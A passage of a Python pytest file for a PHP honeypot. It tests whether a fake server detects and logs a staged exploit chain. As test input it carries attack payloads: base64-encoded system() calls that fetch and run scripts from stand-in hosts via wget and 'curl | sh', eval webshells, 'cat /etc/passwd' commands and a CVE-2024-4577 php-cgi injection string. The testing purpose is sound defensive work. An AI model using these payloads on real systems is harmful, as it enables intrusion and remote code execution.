import asyncio
import base64
import hashlib
import json
import os
from datetime import datetime, timezone
from unittest.mock import MagicMock, patch

import pytest

from trap.handlers.default import HTTPHandler
from trap.main import Honeypot
from trap.storage.file import FileStorage
from trap.storage.mysql import MySQLStorage


def _parse_audit_metadata(decoded_content: str) -> dict:
    assert decoded_content.startswith("[PHP2SHELL_AUDIT] ")
    first_line = decoded_content.split("\n", 1)[0]
    raw_json = first_line[len("[PHP2SHELL_AUDIT] ") :].strip()
    return json.loads(raw_json)


# =====================================================================
# 1. 单元测试 (Unit Tests)
# =====================================================================


def test_stage1_php_fingerprint_and_upload_progress_probe():
    handler = HTTPHandler()

    # 1a. 普通 HTTP 请求暴露易受攻击的 PHP 版本号 (< 8.3.36)，保持协议名 "http" 向后兼容
    proto, decoded, resp = handler.handle(b"GET / HTTP/1.1\r\nHost: target.local\r\n\r\n")
    assert proto == "http"
    assert b"X-Powered-By: PHP/8.3.34" in resp

    # 1b. Nuclei CVE-2026-109618.yaml 风格探测：Multipart 携带 PHPSESSID 与 PHP_SESSION_UPLOAD_PROGRESS
    boundary = "----NucleiProbeBoundary"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        f"nuclei_sess_fixed_123\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"probe_init\r\n"
        f"--{boundary}--\r\n"
    ).encode("utf-8")
    req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode("utf-8") + body

    proto, decoded, resp = handler.handle(req, session_id="203.0.113.10:50001")
    assert proto == "http/php2shell"
    assert b"Set-Cookie: PHPSESSID=nuclei_sess_fixed_123; path=/" in resp
    meta = _parse_audit_metadata(decoded)
    assert meta["stage"] == "STAGE_1_RECON"
    assert meta["phpsessid"] == "nuclei_sess_fixed_123"
    assert "CVE-2026-109618" in meta["cves"]


def test_stage2_cve_2026_109618_oom_bailout_trigger():
    handler = HTTPHandler()
    boundary = "----OOMTriggerBoundary"

    # 构造未闭合 boundary 且声明超大 Content-Length (128MB) 的 OOM 触发载荷
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f'|O:8:"stdClass":1:{{s:4:"leak";i:1;}}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="heap_groom.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode("utf-8") + (b"\x00\x00\x7f\x41\x41\x41\x41\x41" * 64)

    req = (
        f"POST /upload.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID=oom_sess_99\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: 134217728\r\n\r\n"
    ).encode("utf-8") + body

    proto, decoded, resp = handler.handle(req, session_id="203.0.113.20:50002")
    assert proto == "http/php2shell"
    assert b"HTTP/1.1 500 Internal Server Error" in resp
    assert b"Allowed memory size of 134217728 bytes exhausted" in resp

    meta = _parse_audit_metadata(decoded)
    assert meta["stage"] == "STAGE_2_OOM_TRIGGER"
    assert meta["worker_corrupted"] is True
    assert "CVE-2026-109618" in meta["cves"]


def test_stage3_cve_2026_109619_uaf_and_command_execution():
    handler = HTTPHandler()

    # Step 1: 先触发 Stage 2 污染 Worker 全局状态
    boundary = "----BailoutBoundary"
    stage2_body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"corrupt_worker_state\r\n"
        # 故意不闭合 boundary 模拟畸形截断触发 OOM/bailout
    ).encode("utf-8")
    stage2_req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID=uaf_worker_1\r\n"
        f"X-PHP2Shell-Malformed: 1\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: 134217728\r\n\r\n"
    ).encode("utf-8") + stage2_body

    _, dec2, _ = handler.handle(stage2_req, session_id="203.0.113.30:51000")
    meta2 = _parse_audit_metadata(dec2)
    assert meta2["stage"] == "STAGE_2_OOM_TRIGGER"

    # Step 2: 同一攻击者在新端口连接上发起 Stage 3 UAF 利用，携带嵌套 Base64 + Canary + 远控下载命令
    inner_php = (
        "system('id; echo CANARY_PHP2SHELL_OK; "
        "wget http://198.51.100.77/dropper.sh -O /tmp/d.sh');"
        "echo md5('verify_rce');"
    )
    b64_payload = base64.b64encode(inner_php.encode()).decode()
    stage3_body = f"payload=eval(base64_decode('{b64_payload}'));".encode("utf-8")
    stage3_req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID=uaf_worker_1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(stage3_body)}\r\n\r\n"
    ).encode("utf-8") + stage3_body

    proto3, dec3, resp3 = handler.handle(stage3_req, session_id="203.0.113.30:51001")
    assert proto3 == "http/php2shell"
    assert b"uid=33(www-data) gid=33(www-data) groups=33(www-data)" in resp3
    assert b"CANARY_PHP2SHELL_OK" in resp3
    expected_md5 = hashlib.md5(b"verify_rce").hexdigest().encode()
    assert expected_md5 in resp3

    meta3 = _parse_audit_metadata(dec3)
    assert meta3["attack_id"] == meta2["attack_id"]
    assert meta3["stage"] == "STAGE_3_UAF_RCE"
    assert meta3["step_index"] == 2
    assert "CVE-2026-109618" in meta3["cves"]
    assert "CVE-2026-109619" in meta3["cves"]
    assert "http://198.51.100.77/dropper.sh" in meta3["iocs"]
    assert any("id" in c for c in meta3["extracted_commands"])


def test_stage4_virtual_webshell_persistence_and_interaction():
    handler = HTTPHandler()

    # Stage 3: 攻击者通过漏洞写入虚拟 Webshell /var/www/html/shell.php
    shell_b64 = base64.b64encode(b"<?php @eval($_POST['cmd']); ?>").decode()
    drop_body = (
        f"data=file_put_contents('/var/www/html/shell.php', base64_decode('{shell_b64}'));"
        f"system('echo DROPPED_OK');"
    ).encode("utf-8")
    drop_req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(drop_body)}\r\n\r\n"
    ).encode("utf-8") + drop_body

    _, dec_drop, resp_drop = handler.handle(drop_req, session_id="203.0.113.40:60001")
    assert b"DROPPED_OK" in resp_drop
    meta_drop = _parse_audit_metadata(dec_drop)
    assert "/shell.php" in meta_drop["dropped_files"]

    # Stage 4: 攻击者在新连接访问刚刚写入的 /shell.php 执行后渗透命令
    post_body = b"cmd=whoami; pwd; ls -la; cat /etc/passwd"
    webshell_req = (
        f"POST /shell.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(post_body)}\r\n\r\n"
    ).encode("utf-8") + post_body

    proto4, dec4, resp4 = handler.handle(webshell_req, session_id="203.0.113.40:60002")
    assert proto4 == "http/php2shell"
    assert b"www-data" in resp4
    assert b"/var/www/html" in resp4
    assert b"shell.php" in resp4
    assert b"root:x:0:0:root:/root:/bin/bash" in resp4

    meta4 = _parse_audit_metadata(dec4)
    assert meta4["attack_id"] == meta_drop["attack_id"]
    assert meta4["stage"] == "STAGE_4_POST_EXPLOIT"
    assert "/shell.php" in meta4["active_virtual_files"]


def test_multipart_fragmented_tcp_packets():
    handler = HTTPHandler()
    boundary = "----FragmentedBoundary777"

    part1 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"frag_exploit\r\n"
    ).encode("utf-8")
    part2 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="payload"; filename="p.php"\r\n\r\n'
        f"<?php system('id; uname -a'); ?>\r\n"
    ).encode("utf-8")
    part3 = f"--{boundary}--\r\n".encode("utf-8")

    total_body = part1 + part2 + part3
    headers = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(total_body)}\r\n\r\n"
    ).encode("utf-8")

    session_id = "203.0.113.50:44444"

    # 第 1 个分片：仅包含 Header + Part 1
    proto1, dec1, resp1 = handler.handle(headers + part1, session_id=session_id)
    assert proto1 == "http/php2shell"
    assert "[PHP2SHELL_FRAGMENT chunk=1" in dec1
    assert resp1 == b""  # 未收齐前绝不提前返回 200 OK

    # 第 2 个分片：包含 Part 2
    proto2, dec2, resp2 = handler.handle(part2, session_id=session_id)
    assert proto2 == "http/php2shell"
    assert "[PHP2SHELL_FRAGMENT chunk=2" in dec2
    assert resp2 == b""

    # 第 3 个分片：包含尾边界 Part 3，触发完整解析与回显
    proto3, dec3, resp3 = handler.handle(part3, session_id=session_id)
    assert proto3 == "http/php2shell"
    assert b"HTTP/1.1 200 OK" in resp3
    assert b"uid=33(www-data)" in resp3
    assert b"Linux ubuntu-web01" in resp3
    meta3 = _parse_audit_metadata(dec3)
    assert meta3["stage"] == "STAGE_3_UAF_RCE"


def test_storage_metadata_extraction(tmp_path):
    handler = HTTPHandler()
    req = (
        b"GET /index.php?cmd=id HTTP/1.1\r\n"
        b"Host: target.local\r\n\r\n"
    )
    proto, decoded, _ = handler.handle(req, session_id="203.0.113.60:12345")

    # 1. 验证 FileStorage 自动提取 metadata JSON 字段
    log_file = tmp_path / "audit_test.log"
    fs = FileStorage(str(log_file), max_size_mb=10)
    fs.setup()
    ts = datetime.now(timezone.utc)
    fs.record(ts, "203.0.113.60", req, decoded, proto)

    with open(log_file, "r") as f:
        entry = json.loads(f.readline())
        assert entry["protocol"] == "http/php2shell"
        assert "metadata" in entry
        assert entry["metadata"]["stage"] == "STAGE_3_UAF_RCE"
        assert "id" in entry["metadata"]["extracted_commands"]

    # 2. 验证 MySQLStorage 自动将 metadata 写入数据库列
    with patch("mysql.connector.connect"), patch(
        "mysql.connector.pooling.MySQLConnectionPool"
    ) as mock_pool:
        mock_pool_inst = MagicMock()
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_pool.return_value = mock_pool_inst
        mock_pool_inst.get_connection.return_value = mock_conn
        mock_conn.cursor.return_value = mock_cursor

        ms = MySQLStorage("localhost", "root", "", "trap")
        ms.record(ts, "203.0.113.60", req, decoded, proto)

        query, params = mock_cursor.execute.call_args[0]
        assert "metadata" in query
        assert len(params) == 6
        assert json.loads(params[5])["stage"] == "STAGE_3_UAF_RCE"


def test_cve_2024_4577_php_cgi_compat():
    handler = HTTPHandler()
    body = b"<?php system('whoami'); echo 'CGI_RCE_OK'; ?>"
    req = (
        b"POST /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1\r\n"
        b"Host: target.local\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    )
    proto, decoded, resp = handler.handle(req, session_id="203.0.113.70:33333")
    assert proto == "http/php2shell"
    assert b"www-data" in resp
    assert b"CGI_RCE_OK" in resp
    meta = _parse_audit_metadata(decoded)
    assert "CVE-2024-4577" in meta["cves"]


# =====================================================================
# 2. 集成测试 (End-to-End Integration Tests Simulating Real Exploits)
# =====================================================================


async def _send_raw_http(host: str, port: int, chunks: list[bytes]) -> bytes:
    reader, writer = await asyncio.open_connection(host, port)
    for chunk in chunks:
        writer.write(chunk)
        await writer.drain()
        if len(chunks) > 1:
            await asyncio.sleep(0.02)
    response = await asyncio.wait_for(reader.read(8192), timeout=3.0)
    writer.close()
    await writer.wait_closed()
    return response


@pytest.mark.asyncio
async def test_integration_full_php2shell_exploit_chain(tmp_path, monkeypatch):
    """
    参考真实世界的 PHP2Shell (CVE-2026-109618 + CVE-2026-109619) 多阶段自动化攻击脚本：
    1. 扫描探测目标 PHP 版本与 session.upload_progress 会话固定行为 (Stage 1)
    2. 分片发送畸形 Multipart + 序列化伪造结构触发 zend_bailout OOM 内存污染 (Stage 2)
    3. 携带相同 PHPSESSID 触发 var_destroy UAF，执行系统命令校验 Canary、拉取远控木马并写入 Webshell (Stage 3)
    4. 访问落地的 Webshell 进行后渗透信息收集 (Stage 4)
    5. 检查蜜罐日志文件是否完整记录并关联了攻击全过程。
    """
    log_file = tmp_path / "honey_php2shell.log"
    monkeypatch.setenv("STORAGE_TYPE", "file")
    monkeypatch.setenv("LOG_FILE", str(log_file))

    hp = Honeypot()
    server = await asyncio.start_server(hp.handle_connection, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    server_task = asyncio.create_task(server.serve_forever())

    try:
        # -----------------------------------------------------------------
        # Phase 1: 模拟攻击脚本执行指纹探测与 Session Upload Progress 检查
        # -----------------------------------------------------------------
        boundary_probe = "----WebKitFormBoundaryRecon01"
        probe_body = (
            f"--{boundary_probe}\r\n"
            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
            f"pwn_session_2026\r\n"
            f"--{boundary_probe}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"check_rfc1867\r\n"
            f"--{boundary_probe}--\r\n"
        ).encode("utf-8")
        probe_req = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) PHP2Shell-Scanner/1.0\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary_probe}\r\n"
            f"Content-Length: {len(probe_body)}\r\n\r\n"
        ).encode("utf-8") + probe_body

        resp_stage1 = await _send_raw_http("127.0.0.1", port, [probe_req])
        assert b"X-Powered-By: PHP/8.3.34" in resp_stage1
        assert b"Set-Cookie: PHPSESSID=pwn_session_2026; path=/" in resp_stage1

        # -----------------------------------------------------------------
        # Phase 2: 模拟 Producer 请求 (CVE-2026-109618) —— 多分片发送 OOM 触发包
        # 在 php_session_rfc1867_callback 初始化中途触发 longjmp()
        # -----------------------------------------------------------------
        boundary_oom = "----WebKitFormBoundaryOOMBailout"
        oom_chunk1 = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Cookie: PHPSESSID=pwn_session_2026\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary_oom}\r\n"
            f"Content-Length: 134217728\r\n\r\n"
        ).encode("utf-8")

        # 伪造 zend_object / zval 堆布局与未闭合的 multipart 块
        fake_heap_pointers = b"\x00\x00\x7f\xff\xe4\x10\x40\x00" * 40
        oom_chunk2 = (
            f"--{boundary_oom}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f'|O:8:"stdClass":2:{{s:3:"ptr";i:140737019707392;s:4:"pad";s:256:"AAAA";}}\r\n'
            f"--{boundary_oom}\r\n"
            f'Content-Disposition: form-data; name="upload[0][1][2][3][4][5]"; filename="oom.bin"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode("utf-8") + fake_heap_pointers

        resp_stage2 = await _send_raw_http("127.0.0.1", port, [oom_chunk1, oom_chunk2])
        assert b"HTTP/1.1 500 Internal Server Error" in resp_stage2
        assert b"Allowed memory size of 134217728 bytes exhausted" in resp_stage2

        # -----------------------------------------------------------------
        # Phase 3: 模拟 Consumer 请求 (CVE-2026-109619) —— 跨连接劫持残留状态执行 RCE
        # 攻击脚本验证 Canary、执行木马下载并写入持久化 Webshell
        # -----------------------------------------------------------------
        webshell_code = b"<?php @eval($_POST['ant']); ?>"
        webshell_b64 = base64.b64encode(webshell_code).decode()
        rce_php_code = (
            f"system('id; uname -a; echo PWNED_BY_PHP2SHELL_2026; "
            f"curl -fsSL http://203.0.113.250:8080/potassium_bot.sh | sh');"
            f"file_put_contents('/var/www/html/wp-conf.php', base64_decode('{webshell_b64}'));"
        )
        rce_b64 = base64.b64encode(rce_php_code.encode("utf-8")).decode()

        stage3_body = f"uaf_trigger=1&code=eval(base64_decode('{rce_b64}'));".encode("utf-8")
        stage3_req = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Cookie: PHPSESSID=pwn_session_2026\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(stage3_body)}\r\n\r\n"
        ).encode("utf-8") + stage3_body

        resp_stage3 = await _send_raw_http("127.0.0.1", port, [stage3_req])
        assert b"HTTP/1.1 200 OK" in resp_stage3
        # 攻击脚本校验回显 Canary 与 uid，决定是否继续发起第 4 阶段请求
        assert b"uid=33(www-data)" in resp_stage3
        assert b"PWNED_BY_PHP2SHELL_2026" in resp_stage3

        # -----------------------------------------------------------------
        # Phase 4: 模拟攻击脚本连接刚刚写入的虚拟 Webshell (/wp-conf.php) 执行后渗透指令
        # -----------------------------------------------------------------
        stage4_body = b"ant=system('whoami; pwd; ls -la; cat /etc/passwd');"
        stage4_req = (
            f"POST /wp-conf.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Cookie: PHPSESSID=pwn_session_2026\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(stage4_body)}\r\n\r\n"
        ).encode("utf-8") + stage4_body

        resp_stage4 = await _send_raw_http("127.0.0.1", port, [stage4_req])
        assert b"www-data" in resp_stage4
        assert b"wp-conf.php" in resp_stage4
        assert b"root:x:0:0:root:/root:/bin/bash" in resp_stage4

        # 等待异步日志写入完成
        await asyncio.sleep(0.15)

    finally:
        server_task.cancel()
        try:
            await server_task
        except asyncio.CancelledError:
            pass

    # -----------------------------------------------------------------
    # 验证日志完整记录了攻击全过程
    # -----------------------------------------------------------------
    assert os.path.exists(log_file)
    with open(log_file, "r") as f:
        log_entries = [json.loads(line) for line in f if line.strip()]

    # 共 5 条记录：Stage1 (1条) + Stage2 (分片1 + 分片2完结 = 2条) + Stage3 (1条) + Stage4 (1条)
    assert len(log_entries) == 5
    assert all(e["protocol"] == "http/php2shell" for e in log_entries)

    audit_entries = [e for e in log_entries if "metadata" in e]
    assert len(audit_entries) == 4

    stages_recorded = [e["metadata"]["stage"] for e in audit_entries]
    assert stages_recorded == [
        "STAGE_1_RECON",
        "STAGE_2_OOM_TRIGGER",
        "STAGE_3_UAF_RCE",
        "STAGE_4_POST_EXPLOIT",
    ]

    # 验证所有阶段共享同一个 attack_id 且 step_index 递增 (1, 2, 3, 4)
    attack_ids = {e["metadata"]["attack_id"] for e in audit_entries}
    assert len(attack_ids) == 1
    assert [e["metadata"]["step_index"] for e in audit_entries] == [1, 2, 3, 4]

    # 验证 Stage 3 与 Stage 4 的 CVE 归因、IOC 提取、Base64 解码与落地文件记录
    stage3_meta = audit_entries[2]["metadata"]
    assert "CVE-2026-109618" in stage3_meta["cves"]
    assert "CVE-2026-109619" in stage3_meta["cves"]
    assert "http://203.0.113.250:8080/potassium_bot.sh" in stage3_meta["iocs"]
    assert "/wp-conf.php" in stage3_meta["dropped_files"]
    assert any("<?php @eval($_POST['ant']); ?>" in p for p in stage3_meta["decoded_payloads"])

    stage4_meta = audit_entries[3]["metadata"]
    assert "/wp-conf.php" in stage4_meta["active_virtual_files"]
    assert "cat /etc/passwd" in stage4_meta["extracted_commands"]


@pytest.mark.asyncio
async def test_integration_mod_php_single_shot_and_keepalive_webshell(tmp_path, monkeypatch):
    """
    模拟 Apache mod_php 场景下的单包 Pre-Auth RCE 利用及同一 TCP Keep-Alive 连接上的后续交互：
    1. 单个 Multipart POST 请求同时包含 PHP_SESSION_UPLOAD_PROGRESS 堆损坏载荷与命令执行/写马指令
    2. 攻击者不关闭 TCP 连接，直接复用 Keep-Alive 连接请求刚写入的 /cache.php 执行 phpinfo() 与 uname -a
    """
    log_file = tmp_path / "honey_modphp.log"
    monkeypatch.setenv("STORAGE_TYPE", "file")
    monkeypatch.setenv("LOG_FILE", str(log_file))

    hp = Honeypot()
    server = await asyncio.start_server(hp.handle_connection, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    server_task = asyncio.create_task(server.serve_forever())

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)

        # Request 1: 单包融合利用 (Multipart Upload Progress + Shell Redirection 写马 + Canary 回显)
        boundary = "----ModPhpSingleShotBoundary"
        body1 = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"<?php echo '<?php @eval($_POST[\"k\"]); ?>' > /var/www/html/cache.php; system('id; echo MODPHP_1SHOT_OK'); ?>\r\n"
            f"--{boundary}--\r\n"
        ).encode("utf-8")
        req1 = (
            f"POST / HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body1)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode("utf-8") + body1

        writer.write(req1)
        await writer.drain()
        resp1 = await asyncio.wait_for(reader.read(4096), timeout=3.0)
        assert b"uid=33(www-data)" in resp1
        assert b"MODPHP_1SHOT_OK" in resp1

        # Request 2: 在同一个 TCP Keep-Alive 连接上直接访问 /cache.php
        body2 = b"k=phpinfo(); system('uname -a');"
        req2 = (
            f"POST /cache.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body2)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode("utf-8") + body2

        writer.write(req2)
        await writer.drain()
        resp2 = await asyncio.wait_for(reader.read(8192), timeout=3.0)
        assert b"PHP Version 8.3.34" in resp2
        assert b"session.upload_progress.enabled" in resp2
        assert b"Linux ubuntu-web01" in resp2

        writer.close()
        await writer.wait_closed()
        await asyncio.sleep(0.15)

    finally:
        server_task.cancel()
        try:
            await server_task
        except asyncio.CancelledError:
            pass

    with open(log_file, "r") as f:
        entries = [json.loads(line) for line in f if line.strip()]

    assert len(entries) == 2
    assert entries[0]["metadata"]["stage"] == "STAGE_3_UAF_RCE"
    assert entries[1]["metadata"]["stage"] == "STAGE_4_POST_EXPLOIT"
    assert entries[0]["metadata"]["attack_id"] == entries[1]["metadata"]["attack_id"]
    assert "/cache.php" in entries[1]["metadata"]["active_virtual_files"]


# =====================================================================
# 3. 进阶实战变形与非标准边界测试 (Edge Cases & Deformed Payloads)
# =====================================================================


def test_phpsessid_with_underscore_and_special_chars_across_proxy_pool():
    """
    验证缺陷 1 修复：
    PHPSESSID 包含下划线 `_` 等特殊字符（如 `attacker_sid_curl_2026`）时不会被截断为 `attacker`，
    且当攻击者使用代理池在每次请求切换不同源 IP 时，仍能通过完整 PHPSESSID 将整条攻击链关联到同一个 attack_id。
    """
    handler = HTTPHandler()
    sid = "attacker_sid_curl_2026"

    # Step 1 (Proxy IP 1): Stage 1 探测
    boundary = "----ProxyPoolBoundary1"
    body1 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"recon_check\r\n"
        f"--{boundary}--\r\n"
    ).encode("utf-8")
    req1 = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body1)}\r\n\r\n"
    ).encode("utf-8") + body1

    _, dec1, resp1 = handler.handle(req1, session_id="198.51.100.11:51001")
    meta1 = _parse_audit_metadata(dec1)
    assert meta1["phpsessid"] == sid
    assert f"Set-Cookie: PHPSESSID={sid}; path=/".encode() in resp1

    # Step 2 (Proxy IP 2 - 切换了源 IP): Stage 2 OOM 触发
    body2 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f'|O:8:"stdClass":1:{{s:1:"a";i:1;}}\r\n'
    ).encode("utf-8")
    req2 = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: 16384\r\n\r\n"
    ).encode("utf-8") + body2

    _, dec2, _ = handler.handle(req2, session_id="203.0.113.22:52002")
    meta2 = _parse_audit_metadata(dec2)
    assert meta2["phpsessid"] == sid
    assert meta2["attack_id"] == meta1["attack_id"]
    assert meta2["stage"] == "STAGE_2_OOM_TRIGGER"

    # Step 3 (Proxy IP 3 - 再次切换源 IP，且通过 Query 参数传递带下划线的 PHPSESSID): Stage 3 RCE
    req3 = (
        f"GET /index.php?PHPSESSID={sid}&cmd=id HTTP/1.1\r\n"
        f"Host: target.local\r\n\r\n"
    ).encode("utf-8")
    _, dec3, resp3 = handler.handle(req3, session_id="192.0.2.33:53003")
    meta3 = _parse_audit_metadata(dec3)
    assert meta3["phpsessid"] == sid
    assert meta3["attack_id"] == meta1["attack_id"]
    assert meta3["step_index"] == 3
    assert b"uid=33(www-data)" in resp3


@pytest.mark.asyncio
async def test_medium_content_length_truncated_oom_and_disconnect_cleanup_persistence(
    tmp_path, monkeypatch
):
    """
    验证缺陷 2 修复：
    1. 攻击者声明中等长度 Content-Length: 16384 (16KB < 64KB)，但只发送约 500 字节且故意不发送闭合 boundary 时，
       蜜罐不会返回空响应挂起傻等，而是立即判定为半初始化 OOM/bailout 触发并返回 500 响应。
    2. 当攻击者发送真正未完成的 Header/小分片后直接断开连接时，main.py 的 finally 块会将 cleanup_session
       重组出的 [PHP2SHELL_AUDIT] 摘要完整持久化写入日志存储。
    """
    # Part A: 单包中等长度 Content-Length (16384) + 500B 截断 Multipart 立即放行并返回 500
    handler = HTTPHandler()
    boundary = "----MediumCLTruncatedBoundary"
    truncated_body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"half_init_bailout_" + ("A" * 320) + "\r\n"
    ).encode("utf-8")
    assert 400 < len(truncated_body) < 1000

    req_medium = (
        f"POST /upload.php HTTP/1.1\r\n"
        f"Host: target.local\r\n"
        f"Cookie: PHPSESSID=medium_cl_sid_01\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: 16384\r\n\r\n"
    ).encode("utf-8") + truncated_body

    proto, decoded, resp = handler.handle(req_medium, session_id="198.51.100.55:60100")
    assert proto == "http/php2shell"
    assert resp != b""
    assert b"HTTP/1.1 500 Internal Server Error" in resp
    meta = _parse_audit_metadata(decoded)
    assert meta["stage"] == "STAGE_2_OOM_TRIGGER"
    assert meta["worker_corrupted"] is True

    # Part B: 攻击者先发小分片进入缓冲区后直接断开 TCP 连接，验证 finally 块将 cleanup 结果落盘
    log_file = tmp_path / "honey_cleanup_audit.log"
    monkeypatch.setenv("STORAGE_TYPE", "file")
    monkeypatch.setenv("LOG_FILE", str(log_file))

    hp = Honeypot()
    server = await asyncio.start_server(hp.handle_connection, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    server_task = asyncio.create_task(server.serve_forever())

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        # 声明 Content-Length: 800 (< 1024)，只发 180 字节且不闭合 boundary，进入 buffer 后立即断开连接
        partial_body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"abrupt_disconnect_oom\r\n"
        ).encode("utf-8")
        partial_req = (
            f"POST /index.php HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Cookie: PHPSESSID=disconnect_sid_2026\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: 800\r\n\r\n"
        ).encode("utf-8") + partial_body

        writer.write(partial_req)
        await writer.drain()
        await asyncio.sleep(0.05)
        writer.close()
        await writer.wait_closed()
        await asyncio.sleep(0.15)
    finally:
        server_task.cancel()
        try:
            await server_task
        except asyncio.CancelledError:
            pass

    with open(log_file, "r") as f:
        entries = [json.loads(line) for line in f if line.strip()]

    # 第 1 条为 [PHP2SHELL_FRAGMENT]，第 2 条为断开连接时 cleanup 写入的 [PHP2SHELL_AUDIT]
    assert len(entries) == 2
    assert "[PHP2SHELL_FRAGMENT" in entries[0]["decoded_content"]
    assert "metadata" in entries[1]
    assert entries[1]["metadata"]["phpsessid"] == "disconnect_sid_2026"
    assert entries[1]["metadata"]["stage"] == "STAGE_2_OOM_TRIGGER"
    assert entries[1]["metadata"]["worker_corrupted"] is True


def test_rewrite_pseudo_static_route_without_php_extension_or_phpsessid():
    """
    验证缺陷 3 修复：
    针对 Laravel/WordPress/ThinkPHP 等伪静态路由（如 POST /api/upload、POST /login，无 .php 后缀），
    当攻击者通过代理池切换了 IP、未携带 PHPSESSID，且通过自定义 Header（如 X-Requested-With）
    或特定 Cookie 传递混淆/二进制载荷时，蜜罐能精准识别并关联到已污染的 Worker 攻击链。
    """
    handler = HTTPHandler()

    # Step 1: 攻击者从代理 IP 1 触发 Stage 2 Worker 内存污染（路由为伪静态 /api/upload）
    boundary = "----LaravelUploadBoundary"
    stage2_body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f'|O:8:"stdClass":1:{{s:4:"heap";i:1;}}\r\n'
    ).encode("utf-8")
    stage2_req = (
        f"POST /api/upload HTTP/1.1\r\n"
        f"Host: laravel.local\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
